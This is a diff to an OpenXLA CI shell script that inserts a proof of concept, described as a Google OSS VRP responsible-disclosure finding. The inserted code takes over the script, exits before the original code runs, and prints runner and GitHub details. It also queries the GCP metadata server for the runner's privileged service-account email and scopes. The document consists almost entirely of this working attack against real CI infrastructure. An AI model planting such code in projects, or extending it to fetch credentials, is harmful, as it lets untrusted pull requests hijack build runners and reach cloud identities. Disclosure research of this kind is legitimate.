@@ -1,3 +1,27 @@
+#!/bin/bash
+# F-0016 PoC — Google OSS VRP responsible disclosure.
+# Proves: unapproved fork-PR code executes on openxla/xla self-hosted runner
+# and reaches the runner's privileged GCP service-account IDENTITY.
+# Does NOT fetch access token. Identity + scopes metadata only.
+set -uo pipefail
+echo "==== F-0016-PoC START ===="
+echo "github.actor    : ${GITHUB_ACTOR:-?}"
+echo "github.event    : ${GITHUB_EVENT_NAME:-?}"
+echo "github.repo     : ${GITHUB_REPOSITORY:-?}"
+echo "github.sha      : ${GITHUB_SHA:-?}"
+echo "runner.name     : ${RUNNER_NAME:-?}"
+echo "runner.os       : ${RUNNER_OS:-?}"
+echo "hostname        : $(hostname 2>/dev/null || echo ?)"
+echo "whoami          : $(whoami 2>/dev/null || echo ?)"
+MD="http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default"
+SA_EMAIL=$(curl -sf -m5 -H "Metadata-Flavor: Google" "$MD/email" 2>/dev/null || echo "unreachable")
+SA_SCOPES=$(curl -sf -m5 -H "Metadata-Flavor: Google" "$MD/scopes" 2>/dev/null | tr "\n" "," || echo "unreachable")
+echo "gcp.sa.email    : $SA_EMAIL"
+echo "gcp.sa.scopes   : $SA_SCOPES"
+echo "==== F-0016-PoC END ===="
+exit 0
+# ---- original script below (not reached) ----
+
 # Copyright 2025 The OpenXLA Authors. All Rights Reserved.
 #
 # Licensed under the Apache License, Version 2.0 (the "License");
